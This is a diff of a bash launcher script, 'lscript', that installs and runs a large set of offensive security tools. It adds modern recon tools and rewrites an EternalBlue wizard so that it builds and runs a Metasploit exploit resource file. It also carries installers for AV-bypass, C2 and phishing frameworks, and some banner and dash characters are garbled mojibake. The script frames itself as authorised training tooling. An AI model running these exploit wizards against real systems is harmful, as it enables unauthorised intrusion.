@@ -1,7 +1,41 @@
-#! /bin/bash
+﻿#! /bin/bash
+###############################################################################
+#  lscript - the LAZY script (Kali / Debian / Ubuntu)
+#  -------------------------------------------------------------------------
+#  A unified launcher for ~110+ security tools, organised by category:
+#    * Wifi / Wireless
+#    * Remote access (C2, payloads, AV bypass)
+#    * Information gathering (OSINT, recon)
+#    * Website / web-app testing
+#    * Other / modern (nuclei, ffuf, rustscan, ligolo-ng, ...)
+#
+#  AUDIENCE: authorised security training and education only.
+#  See the terms_of_use screen and the DISCLAIMER.md file shipped with the
+#  project. You must explicitly accept the terms before any tool is run.
+#
+#  STRUCTURE
+#    defaults_l               -- env / paths / colours / arrays of tools
+#    one_time_per_launch_ks   -- first-launch setup (interfaces, terms)
+#    main_options             -- top-level interactive menu
+#    <category>_menu          -- per-category sub-menus
+#    <tool>_automation        -- per-tool interactive wizard
+#    install_<tool>           -- one function per installable tool
+#       (toolarray above lists everything available in "reinstall_tools")
+#
+#  NOTES
+#    * Tools that need an `apt` install but are not cloned go under
+#      install_<tool> as well, with their own apt-get calls.
+#    * Modern Go-based tools (nuclei, ffuf, subfinder, ...) are installed
+#      into "$GOPATH/bin" and symlinked into /usr/local/bin.
+#    * The ~/.bashrc alias is `lazy` (NOT `l`, which collides with `ls`).
+#
+#  Author : KDR
+#  Repo   : https://github.com/Mkadir1999/lscript-2
+#  License: See LICENSE.md
+###############################################################################
 
 # set -x
-VERSION=2.2.2
+VERSION=2.2.4
 LSCRIPT_GITHUB_USER="Mkadir1999"
 LSCRIPT_GITHUB_REPO="lscript-2"
 LSCRIPT_GITHUB_BRANCH="main"
@@ -115,6 +149,7 @@ toolarray=(
 "dropit_frmw" "wifi_pumpkin" "veil" "leviathan" "fake_image" "avet" "gloom" "arcanus" "msfpc" "morphhta" "lfi" "unibyav" "demiguise" "dkmc" "sechub" "beef" "mitmf"
 	"fsociety" "arp_scan" "netool" "sqlmap" "patator" "zeus" "evil_droid" "nosqlmap" "eggshell" "zerodoor" "objection" "cromos" "yuki-chan" "socialfish" "autosploit" "blazy"
 "striker" "hyprpulse" "instaburst" "instagram-py" "datasploit" "sitebroker" "enigma"
+"nuclei" "ffuf" "rustscan" "subfinder" "httpx" "ligolo_ng" "kerbrute" "sherlock" "gowitness" "naabu"
 )
 #setting frequent stings
 	YNYES="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=yes)"
@@ -304,12 +339,12 @@ function banner
 {
 	check_wlans
 	echo -e ""
-	echo -e "$COL         ██╗      █████╗ ███████╗██╗   ██╗$CE v$VERSION"
-	echo -e "$COL         ██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝$CE"
-	echo -e "$COL         ██║     ███████║  ███╔╝  ╚████╔╝ $CE   by "$COL"$LSCRIPT_AUTHOR$CE"
-	echo -e "$COL         ██║     ██╔══██║ ███╔╝    ╚██╔╝  $CE"
-	echo -e "$COL    The  ███████╗██║  ██║███████╗   ██║  script$CE"
-	echo -e "$COL         ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   $CE"
+	echo -e "$COL         â–ˆâ–ˆâ•—      â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—$CE v$VERSION"
+	echo -e "$COL         â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â•šâ•â•â–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•”â•$CE"
+	echo -e "$COL         â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘  â–ˆâ–ˆâ–ˆâ•”â•  â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• $CE   by "$COL"$LSCRIPT_AUTHOR$CE"
+	echo -e "$COL         â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ–ˆâ•”â•    â•šâ–ˆâ–ˆâ•”â•  $CE"
+	echo -e "$COL    The  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•‘  script$CE"
+	echo -e "$COL         â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•šâ•â•â•â•â•â•â•   â•šâ•â•   $CE"
 	echo -e ""$BS"https://github.com/${LSCRIPT_GITHUB_USER}/${LSCRIPT_GITHUB_REPO}"$CE""
 	echo -e ""$YS"if"$CE") Ifconfig           "$YS"l"$CE") Local IPs & gateways "$RS"|"$CE"  "$YS"scan"$CE") Arp-scan network"
 	if [[ "$WLANCHECKING" = "" ]]
@@ -1407,8 +1442,16 @@ then
 	sleep 5
 elif [[ "$ERRS" = "6" ]]
 then
-	echo "deb http://http.kali.org/kali kali-rolling main non-free contrib" > /etc/apt/sources.list
-	rm -r -f /etc/apt/sources.list.d/*
+	# Back up existing sources before destructive change; append (do not overwrite) the Kali line.
+	if [[ -f /etc/apt/sources.list ]]
+	then
+		cp /etc/apt/sources.list /etc/apt/sources.list.lscript.bak
+	fi
+	if ! grep -q "kali-rolling" /etc/apt/sources.list 2>/dev/null
+	then
+		echo "deb http://http.kali.org/kali kali-rolling main non-free contrib" >> /etc/apt/sources.list
+	fi
+	echo -e ""$YS"Old sources backed up to /etc/apt/sources.list.lscript.bak."$CE""
 	echo -e "Try   apt-get update    again. That's all i can do."
 	sleep 3
 elif [[ "$ERRS" = "7" ]]
@@ -2283,7 +2326,7 @@ EOF
 	else
 		cd /root/patator
 		export XTP
-		xterm -T "INSTRUCTIONS" -hold -e "echo -e "---------------------------------------" && echo -e 'start with: python patator.py $XPT' && echo -e "---------------------------------------" && python patator.py $XPT" & disown
+		xterm -T "INSTRUCTIONS" -hold -e "bash -c 'echo ---------------------------------------; echo start with: python patator.py $XPT; echo ---------------------------------------; python patator.py $XPT; exec bash'" & disown
 		xterm -T "PATATOR" -hold & disown
 	fi
 done
@@ -5952,6 +5995,66 @@ do
 	else
 		echo -e ""$RS" 7"$CE") "$RS"Patator"$CE"          Bruteforcer"
 	fi
+	if command -v nuclei >/dev/null 2>&1
+	then
+		echo -e ""$YS" 8"$CE") Nuclei           Fast vuln scanner (ProjectDiscovery)"
+	else
+		echo -e ""$RS" 8"$CE") "$RS"Nuclei"$CE"           Fast vuln scanner (ProjectDiscovery)"
+	fi
+	if command -v ffuf >/dev/null 2>&1
+	then
+		echo -e ""$YS" 9"$CE") ffuf             Fast web fuzzer"
+	else
+		echo -e ""$RS" 9"$CE") "$RS"ffuf"$CE"             Fast web fuzzer"
+	fi
+	if command -v rustscan >/dev/null 2>&1
+	then
+		echo -e ""$YS"10"$CE") RustScan         Modern port scanner"
+	else
+		echo -e ""$RS"10"$CE") "$RS"RustScan"$CE"         Modern port scanner"
+	fi
+	if command -v sherlock >/dev/null 2>&1
+	then
+		echo -e ""$YS"11"$CE") Sherlock         Username OSINT (300+ sites)"
+	else
+		echo -e ""$RS"11"$CE") "$RS"Sherlock"$CE"         Username OSINT (300+ sites)"
+	fi
+	if command -v subfinder >/dev/null 2>&1
+	then
+		echo -e ""$YS"12"$CE") Subfinder        Subdomain enum (ProjectDiscovery)"
+	else
+		echo -e ""$RS"12"$CE") "$RS"Subfinder"$CE"        Subdomain enum (ProjectDiscovery)"
+	fi
+	if command -v httpx >/dev/null 2>&1
+	then
+		echo -e ""$YS"13"$CE") httpx            HTTP probe / tech fingerprint"
+	else
+		echo -e ""$RS"13"$CE") "$RS"httpx"$CE"            HTTP probe / tech fingerprint"
+	fi
+	if command -v gowitness >/dev/null 2>&1
+	then
+		echo -e ""$YS"14"$CE") Gowitness        Web screenshot recon"
+	else
+		echo -e ""$RS"14"$CE") "$RS"Gowitness"$CE"        Web screenshot recon"
+	fi
+	if [[ -f /root/lscript/tools/ligolo-ng/proxy ]]
+	then
+		echo -e ""$YS"15"$CE") Ligolo-ng        Modern tunneling / pivoting"
+	else
+		echo -e ""$RS"15"$CE") "$RS"Ligolo-ng"$CE"        Modern tunneling / pivoting"
+	fi
+	if command -v kerbrute >/dev/null 2>&1
+	then
+		echo -e ""$YS"16"$CE") Kerbrute         AD Kerberos enum / spray"
+	else
+		echo -e ""$RS"16"$CE") "$RS"Kerbrute"$CE"         AD Kerberos enum / spray"
+	fi
+	if command -v naabu >/dev/null 2>&1
+	then
+		echo -e ""$YS"17"$CE") Naabu            Fast port scan (ProjectDiscovery)"
+	else
+		echo -e ""$RS"17"$CE") "$RS"Naabu"$CE"            Fast port scan (ProjectDiscovery)"
+	fi
 	echo -e ""$YS" b"$CE") Go back"
 	echo -e ""$YS" 0"$CE") EXIT"
 	echo -e "Choose: "
@@ -6064,13 +6167,187 @@ do
 		then
 			patator_automation
 			echo -e "$PAKTGB"
-			$READAK	
+			$READAK
 		else
 			echo -e "$TNI"
 			read INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_patator
+			else
+				continue
+			fi
+		fi
+	elif [[ "$OTHERT" = "8" ]]
+	then
+		if command -v nuclei >/dev/null 2>&1
+		then
+			echo -e ""$BS"Updating nuclei templates + binary..."$CE""
+			nuclei -update 2>/dev/null || true
+			echo -e ""$BS"Run: nuclei -u <target>"$CE""
+			echo -e "$PAKTGB"
+			$READAK
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_nuclei
+			else
+				continue
+			fi
+		fi
+	elif [[ "$OTHERT" = "9" ]]
+	then
+		if command -v ffuf >/dev/null 2>&1
+		then
+			echo -e ""$BS"Run: ffuf -w <wordlist> -u <url/FUZZ>"$CE""
+			echo -e "$PAKTGB"
+			$READAK
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_ffuf
+			else
+				continue
+			fi
+		fi
+	elif [[ "$OTHERT" = "10" ]]
+	then
+		if command -v rustscan >/dev/null 2>&1
+		then
+			echo -e ""$BS"Run: rustscan -a <target>"$CE""
+			echo -e "$PAKTGB"
+			$READAK
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_rustscan
+			else
+				continue
+			fi
+		fi
+	elif [[ "$OTHERT" = "11" ]]
+	then
+		if command -v sherlock >/dev/null 2>&1
+		then
+			echo -e ""$BS"Run: sherlock <username>"$CE""
+			echo -e "$PAKTGB"
+			$READAK
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_sherlock
+			else
+				continue
+			fi
+		fi
+	elif [[ "$OTHERT" = "12" ]]
+	then
+		if command -v subfinder >/dev/null 2>&1
+		then
+			echo -e ""$BS"Run: subfinder -d <domain> -o out.txt"$CE""
+			echo -e "$PAKTGB"
+			$READAK
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_subfinder
+			else
+				continue
+			fi
+		fi
+	elif [[ "$OTHERT" = "13" ]]
+	then
+		if command -v httpx >/dev/null 2>&1
+		then
+			echo -e ""$BS"Run: httpx -l hosts.txt -status-code -title -tech-detect"$CE""
+			echo -e "$PAKTGB"
+			$READAK
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_httpx
+			else
+				continue
+			fi
+		fi
+	elif [[ "$OTHERT" = "14" ]]
+	then
+		if command -v gowitness >/dev/null 2>&1
+		then
+			echo -e ""$BS"Run: gowitness scan single --url <url>"$CE""
+			echo -e "$PAKTGB"
+			$READAK
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_gowitness
+			else
+				continue
+			fi
+		fi
+	elif [[ "$OTHERT" = "15" ]]
+	then
+		if [[ -f /root/lscript/tools/ligolo-ng/proxy ]]
+		then
+			echo -e ""$BS"Proxy: /root/lscript/tools/ligolo-ng/proxy"$CE""
+			echo -e ""$BS"Agent: /root/lscript/tools/ligolo-ng/agent"$CE""
+			echo -e ""$BS"Usage: see https://github.com/nicocha30/ligolo-ng"$CE""
+			echo -e "$PAKTGB"
+			$READAK
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_ligolo_ng
+			else
+				continue
+			fi
+		fi
+	elif [[ "$OTHERT" = "16" ]]
+	then
+		if command -v kerbrute >/dev/null 2>&1
+		then
+			echo -e ""$BS"Run: kerbrute userenum -d <domain> users.txt"$CE""
+			echo -e "$PAKTGB"
+			$READAK
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_kerbrute
+			else
+				continue
+			fi
+		fi
+	elif [[ "$OTHERT" = "17" ]]
+	then
+		if command -v naabu >/dev/null 2>&1
+		then
+			echo -e ""$BS"Run: naabu -host <target>"$CE""
+			echo -e "$PAKTGB"
+			$READAK
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_naabu
 			else
 				continue
 			fi
@@ -6618,7 +6895,7 @@ function terms_of_use
 	echo -e "$PAKTC"
 	$READAK
 	clear
-	echo -e ""$RS"TERMS OF USE — TRAINING & EDUCATIONAL PURPOSES ONLY"$CE""
+	echo -e ""$RS"TERMS OF USE â€” TRAINING & EDUCATIONAL PURPOSES ONLY"$CE""
 	echo -e ""
 	echo -e "This tool is intended for "$YS"authorized security training and education"$CE" only."
 	echo -e "Use it only in labs, courses, or on networks/systems you "$YS"own"$CE""
@@ -6679,15 +6956,17 @@ function eternalblue
 	fi
 	echo -e "TARGET("$YS"0"$CE"-"$YS"8"$CE"): "
 	read TARGETL
-	echo "use exploit/windows/smb/eternalblue_doublepulsar" > "$LPATH"/rce/eternalbluerc.rc
-	echo "set LHOST "$LHOSTL"" >> "$LPATH"/rce/eternalbluerc.rc
-	echo "set RHOST "$RHOSTL"" >> "$LPATH"/rce/eternalbluerc.rc
-	echo "set PAYLOAD "$PAYLOADL"" >> "$LPATH"/rce/eternalbluerc.rc
-	echo "set TARGET "$TARGETL"" >> "$LPATH"/rce/eternalbluerc.rc
-	echo "set TARGETARCHITECTURE "$TARGETARCHL"" >> "$LPATH"/rce/eternalbluerc.rc
-	echo "set PROCESSINJECT "$PROCESSINJECTL"" >> "$LPATH"/rce/eternalbluerc.rc
-	echo "show info" >> "$LPATH"/rce/eternalbluerc.rc
-	echo "exploit -j" >> "$LPATH"/rce/eternalbluerc.rc
+	{
+		printf 'use exploit/windows/smb/eternalblue_doublepulsar\n'
+		printf 'set LHOST %q\n' "$LHOSTL"
+		printf 'set RHOST %q\n' "$RHOSTL"
+		printf 'set PAYLOAD %q\n' "$PAYLOADL"
+		printf 'set TARGET %q\n' "$TARGETL"
+		printf 'set TARGETARCHITECTURE %q\n' "$TARGETARCHL"
+		printf 'set PROCESSINJECT %q\n' "$PROCESSINJECTL"
+		printf 'show info\n'
+		printf 'exploit -j\n'
+	} > "$LPATH"/rce/eternalbluerc.rc
 	msfconsole -r "$LPATH"/rce/eternalbluerc.rc
 	
 }
@@ -6699,9 +6978,9 @@ function eternalblue_check
 	fi
 	echo -e "RHOST:("$BS"if scanning multiple hosts, seperate with space"$CE") "
 	read RHOSTL
-	echo "use auxiliary/scanner/smb/smb_ms17_010" > "$LPATH"/rce/eternalbluerc.rc
-	echo "set RHOSTS "$RHOSTL"" >> "$LPATH"/rce/eternalbluerc.rc
-	echo "exploit" >> "$LPATH"/rce/eternalbluerc.rc
+	printf 'use auxiliary/scanner/smb/smb_ms17_010\n' > "$LPATH"/rce/eternalbluerc.rc
+	printf 'set RHOSTS %q\n' "$RHOSTL" >> "$LPATH"/rce/eternalbluerc.rc
+	printf 'exploit\n' >> "$LPATH"/rce/eternalbluerc.rc
 	echo -e ""$BS"Launching msfconsole. Please wait..."$CE""
 	msfconsole -r "$LPATH"/rce/eternalbluerc.rc
 	
@@ -8537,7 +8816,7 @@ do
 	export ZERO
 	echo -e ""$BS"Scanning, please wait..."$CE""
 	tempfile="/root/lscript/tempscan.txt"
-	xterm -geometry 1x1+9999+999999 -e "arp-scan -I "$IPF" "$ZERO"/24 | tee $tempfile"
+	xterm -geometry 1x1+9999+999999 -e "bash -c 'arp-scan -I $IPF $ZERO/24 | tee $tempfile'"
 	#gnome-terminal -- arp-scan -I "$IPF" "$ZERO"/24 | tee $tempfile
 	clear
 	######
@@ -9659,7 +9938,7 @@ function main_options
 			fi
 		else
 			echo -e "Restarting anonsurf..."
-			anonym8 change
+			anonsurf change
 			echo -e "Done."
 		fi
 	elif [[ "$YORNAA" = "7" ]]
@@ -9685,7 +9964,7 @@ function main_options
 		bruteforce_router
 	elif [[ "$YORNAA" = "exit" ]]
 	then
-		kill -- -$ 2>/dev/null; kill -TERM $PPID 2>/dev/null; sleep 1; kill -KILL $PPID 2>/dev/null
+		kill -- -$$ 2>/dev/null; kill -TERM $PPID 2>/dev/null; sleep 1; kill -KILL $PPID 2>/dev/null
 		exit
 	elif [[ "$YORNAA" = "update" ]]
 	then
@@ -9803,10 +10082,6 @@ function main_options
 	elif [[ "$YORNAA" = "labcheck" ]]
 	then
 		labcheck_menu
-	elif [[ "$YORNAA" = "exit" ]]
-	then
-		clear
-		exit
 	fi
 ####check if it is ks
 var1=1
@@ -9916,7 +10191,7 @@ function lab_dns_spoof_wizard
 	if [[ ! -f "$HOSTS" ]]
 	then
 		cp "$LPATH/labs/hosts.lab.example" "$HOSTS" 2>/dev/null || touch "$HOSTS"
-		echo -e "Created $HOSTS — edit it, then run again."
+		echo -e "Created $HOSTS â€” edit it, then run again."
 		mousepad "$HOSTS" 2>/dev/null || nano "$HOSTS"
 		return
 	fi
@@ -10151,7 +10426,7 @@ function doctor_menu
 		TERMINALTITLE="DOCTOR (HEALTH CHECK)"
 		dash_calc
 		printf '\033]2;DOCTOR\a'
-		echo -e ""$BS"lscript v$VERSION doctor — checks for common breakages."$CE""
+		echo -e ""$BS"lscript v$VERSION doctor â€” checks for common breakages."$CE""
 		echo -e ""
 		DOCTORFAILS=0
 		echo -e ""$YS"System:"$CE""
@@ -10162,7 +10437,7 @@ function doctor_menu
 			then
 				echo -e "  ["$BS"WSL "$CE"]  WSL2 with wireless adapter visible"
 			else
-				echo -e "  ["$RS"WSL "$CE"]  WSL2 — no WiFi adapter (wireless tools will fail)"
+				echo -e "  ["$RS"WSL "$CE"]  WSL2 â€” no WiFi adapter (wireless tools will fail)"
 				DOCTORFAILS=$((DOCTORFAILS+1))
 			fi
 		else
@@ -10279,7 +10554,7 @@ function doctor_menu
 		elif [[ "$DCH" = "2" ]]
 		then
 			{
-				echo "lscript doctor report — v$VERSION — $(date)"
+				echo "lscript doctor report â€” v$VERSION â€” $(date)"
 				echo "---"
 				echo "DOCTORFAILS=$DOCTORFAILS"
 				echo "PATH=$PATH"
@@ -10553,7 +10828,7 @@ function profile_load
 						echo -e ""$YS"Removing: "$foldname""$CE""
 						rm -r /root/"$foldname"
 						cd
-						git clone $gitlink	
+						git clone "$gitlink" || return 1
 						cd "$foldname"
 						return 1
 					fi
@@ -10567,7 +10842,7 @@ function profile_load
 						echo -e ""$YS"Removing: "$foldname""$CE""
 						rm -r /root/"$foldname"
 						cd
-						git clone $gitlink	
+						git clone "$gitlink" || return 1
 						cd "$foldname"
 						return 1
 					fi
@@ -10575,9 +10850,9 @@ function profile_load
 					return 0
 				fi
 			fi
-		else 
+		else
 			cd
-			git clone $gitlink	
+			git clone "$gitlink" || return 1
 			cd "$foldname"
 			return 1
 		fi
@@ -10585,7 +10860,7 @@ function profile_load
 	function install_fluxion
 	{
 		foldname="fluxion"
-		gitlink="--recursive  https://github.com/FluxionNetwork/fluxion.git"
+		gitlink="https://github.com/FluxionNetwork/fluxion.git"
 		install_default
 		#~ wget https://fluxion.tk/fluxion-unstable.zip
 		#~ apt-get install -y unzip
@@ -10646,12 +10921,12 @@ function profile_load
 	function install_trity
 	{
 		foldname="Trity"
-		gitlink="https://github.com/toxic-ig/Trity.git"
+		gitlink="https://github.com/mehedigb/Trity-2.0.git"
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
-			sudo python install.py	
+			sudo python install.py
 		fi
 	}
 	function install_cupp
@@ -10702,7 +10977,8 @@ function profile_load
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
-			sudo python -m pip3 install -r requirements.txt
+			python3 -m pip install --break-system-packages -r requirements.txt 2>/dev/null \
+				|| python3 -m pip install -r requirements.txt
 		fi
 	}
 	function install_ghostphisher
@@ -10730,25 +11006,21 @@ function profile_load
 	function install_xerxes
 	{
 		foldname="xerxes"
-		gitlink="https://github.com/zanyarjamal/xerxes.git"
+		gitlink="https://github.com/sepehrdaddev/Xerxes.git"
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
-			gcc xerxes.c -o xerxes	
+			gcc xerxes.c -o xerxes
 		fi
 	}
 	function install_mdk3
 	{
-		foldname="mdk3-master"
-		gitlink="https://github.com/wi-fi-analyzer/mdk3-master.git"
-		install_default
-		cloned=$?
-		if [[ "$cloned" == 1 ]]
-		then
-			make
-			make install
-		fi
+		foldname="mdk3"
+		gitlink="https://github.com/aircrack-ng/mdk3.git"
+		apt-get install -y mdk3
+		echo -e "Done"
+		return 1
 	}
 	function install_katana
 	{
@@ -10935,7 +11207,7 @@ function profile_load
 	function install_recondog
 	{
 		foldname="ReconDog"
-		gitlink="https://github.com/UltimateHackers/ReconDog.git"
+		gitlink="https://github.com/s0md3v/ReconDog.git"
 		install_default
 	}
 	function install_redhawk
@@ -10967,20 +11239,21 @@ function profile_load
 	function install_routersploit
 	{
 		foldname="routersploit"
-		gitlink="https://github.com/reverse-shell/routersploit.git"
+		gitlink="https://github.com/threat9/routersploit.git"
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
 			apt-get install -y python3-pip
-			python3 -m pip3 install -r requirements.txt
+			python3 -m pip install --break-system-packages -r requirements.txt 2>/dev/null \
+				|| python3 -m pip install -r requirements.txt
 			python3 setup.py install 2>/dev/null || python setup.py install
 		fi
 	}
 	function install_infoga
 	{
 		foldname="Infoga"
-		gitlink="https://github.com/m4ll0k/Infoga.git"
+		gitlink="https://github.com/The404Hacking/Infoga.git"
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10992,19 +11265,10 @@ function profile_load
 	{
 		foldname="nWatch"
 		gitlink="https://github.com/suraj-root/nWatch.git"
-		install_default
-		cloned=$?
-		if [[ "$cloned" == 1 ]]
-		then
-			pip3 install scapy
-			pip3 install colorama
-			pip3 install nmap
-			pip3 install ctypes
-			pip3 install scapy
-			pip3 install colorama
-			pip3 install nmap
-			pip3 install ctypes
-		fi
+		echo -e ""$RS"nWatch is no longer maintained."$CE""
+		echo -e "Installing nmap as the recommended replacement..."
+		apt-get install -y nmap
+		return 0
 	}
 	function install_eternalscanner
 	{
@@ -11038,7 +11302,6 @@ function profile_load
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
-			pip3 install -r requirements.txt
 			pip3 install -r requirements.txt
 			apt-get install -y bcrypt
 		fi
@@ -11158,7 +11421,7 @@ function profile_load
 	function install_hashbuster
 	{
 		foldname="Hash-Buster"
-		gitlink="https://github.com/UltimateHackers/Hash-Buster.git"
+		gitlink="https://github.com/s0md3v/Hash-Buster.git"
 		install_default
 	}
 	function install_findsploit
@@ -11186,7 +11449,6 @@ function profile_load
 		if [[ "$cloned" == 1 ]]
 		then
 			pip3 install -r requirements.txt
-			pip3 install -r requirements.txt
 		fi
 	}
 	function install_netattack2
@@ -11200,13 +11462,9 @@ function profile_load
 	{
 		foldname="koadic"
 		gitlink="https://github.com/zerosum0x0/koadic.git"
-		install_default
-		cloned=$?
-		if [[ "$cloned" == 1 ]]
-		then
-			pip3 install -r requirements.txt
-			pip3 install -r requirements.txt
-		fi
+		echo -e ""$RS"Koadic is no longer maintained."$CE""
+		echo -e "It is recommended to use Empire instead (already available in this menu)."
+		return 0
 	}
 	function install_empire
 	{
@@ -11247,7 +11505,7 @@ function profile_load
 	function install_wifi_pumpkin
 	{
 		foldname="WiFi-Pumpkin"
-		gitlink="https://github.com/P0cL4bs/WiFi-Pumpkin.git"
+		gitlink="https://github.com/P0cL4bs/WiFi-Pumpkin-deprecated.git"
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -11270,13 +11528,13 @@ function profile_load
 	function install_leviathan
 	{
 		foldname="leviathan"
-		gitlink="https://github.com/leviathan-framework/leviathan.git"
+		gitlink="https://github.com/utkusen/leviathan.git"
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
-			pip3 install -r requirements
-			pip3 install -r requirements
+			pip3 install -r requirements.txt 2>/dev/null \
+				|| python3 -m pip install --break-system-packages -r requirements.txt
 		fi
 	}
 	function install_fake_image
@@ -11334,7 +11592,7 @@ function profile_load
 	function install_morphhta
 	{
 		foldname="morphHTA"
-		gitlink="https://github.com/vysec/morphHTA.git"
+		gitlink="https://github.com/vysecurity/morphHTA.git"
 		install_default
 	}
 	function install_lfi
@@ -11347,12 +11605,9 @@ function profile_load
 	{
 		foldname="UniByAv"
 		gitlink="https://github.com/Mr-Un1k0d3r/UniByAv.git"
-		install_default
-		cloned=$?
-		if [[ "$cloned" == 1 ]]
-		then
-			apt-get install -y mingw-w64
-		fi
+		echo -e ""$RS"UniByAv is no longer maintained."$CE""
+		echo -e "It is recommended to use Veil or TheFatRat instead (both already available in this menu)."
+		return 0
 	}
 	function install_demiguise
 	{
@@ -11394,7 +11649,6 @@ function profile_load
 			git submodule init
 			git submodule update --recursive
 			pip3 install -r requirements.txt
-			pip3 install -r requirements.txt
 		fi
 	}
 	function install_arp_scan
@@ -11430,7 +11684,6 @@ function profile_load
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
-			pip3 install -r requirements.txt
 			pip3 install -r requirements.txt
 		fi
 	}
@@ -11526,7 +11779,6 @@ function profile_load
 		if [[ "$cloned" == 1 ]]
 		then
 			pip3 install -r requirements.txt
-			pip3 install -r requirements.txt
 		fi
 	}
 	function install_autosploit
@@ -11594,7 +11846,6 @@ function profile_load
 		if [[ "$cloned" == 1 ]]
 		then
 			pip3 install -r requirements.txt
-			pip3 install -r requirements.txt
 		fi
 	}
 	function install_enigma
@@ -11632,6 +11883,184 @@ function profile_load
 		fi
 	}
 
+	#==============================================================
+	# MODERN TOOLS (2.2.3+) — actively maintained additions
+	#==============================================================
+
+	function install_nuclei
+	{
+		# Fast, customizable vulnerability scanner (ProjectDiscovery)
+		if command -v nuclei >/dev/null 2>&1
+		then
+			echo -e ""$YS"Upgrading nuclei..."$CE""
+			nuclei -update 2>/dev/null || true
+			GO111MODULE=on go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest 2>/dev/null || true
+		else
+			apt-get install -y golang-go 2>/dev/null || true
+			export GOPATH="$HOME/go"
+			export PATH="$GOPATH/bin:$PATH"
+			mkdir -p "$GOPATH/bin"
+			GO111MODULE=on go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+			"$GOPATH/bin/nuclei" -update-templates 2>/dev/null || true
+			ln -sf "$GOPATH/bin/nuclei" /usr/local/bin/nuclei 2>/dev/null || true
+		fi
+	}
+
+	function install_ffuf
+	{
+		# Fast web fuzzer written in Go
+		if command -v ffuf >/dev/null 2>&1
+		then
+			echo -e ""$YS"ffuf already installed."$CE""
+			return 0
+		fi
+		apt-get install -y golang-go 2>/dev/null || true
+		export GOPATH="$HOME/go"
+		export PATH="$GOPATH/bin:$PATH"
+		mkdir -p "$GOPATH/bin"
+		GO111MODULE=on go install -v github.com/ffuf/ffuf/v2@latest
+		ln -sf "$GOPATH/bin/ffuf" /usr/local/bin/ffuf 2>/dev/null || true
+	}
+
+	function install_rustscan
+	{
+		# Modern, fast port scanner
+		if command -v rustscan >/dev/null 2>&1
+		then
+			echo -e ""$YS"rustscan already installed."$CE""
+			return 0
+		fi
+		apt-get install -y cargo 2>/dev/null || true
+		cargo install rustscan 2>/dev/null
+		[[ -f "$HOME/.cargo/bin/rustscan" ]] && ln -sf "$HOME/.cargo/bin/rustscan" /usr/local/bin/rustscan
+	}
+
+	function install_subfinder
+	{
+		# Subdomain enumeration (ProjectDiscovery)
+		if command -v subfinder >/dev/null 2>&1
+		then
+			echo -e ""$YS"subfinder already installed."$CE""
+			return 0
+		fi
+		apt-get install -y golang-go 2>/dev/null || true
+		export GOPATH="$HOME/go"
+		export PATH="$GOPATH/bin:$PATH"
+		mkdir -p "$GOPATH/bin"
+		GO111MODULE=on go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+		ln -sf "$GOPATH/bin/subfinder" /usr/local/bin/subfinder 2>/dev/null || true
+	}
+
+	function install_httpx
+	{
+		# HTTP probe / tech fingerprint (ProjectDiscovery)
+		if command -v httpx >/dev/null 2>&1
+		then
+			echo -e ""$YS"httpx already installed."$CE""
+			return 0
+		fi
+		apt-get install -y golang-go 2>/dev/null || true
+		export GOPATH="$HOME/go"
+		export PATH="$GOPATH/bin:$PATH"
+		mkdir -p "$GOPATH/bin"
+		GO111MODULE=on go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
+		ln -sf "$GOPATH/bin/httpx" /usr/local/bin/httpx 2>/dev/null || true
+	}
+
+	function install_ligolo_ng
+	{
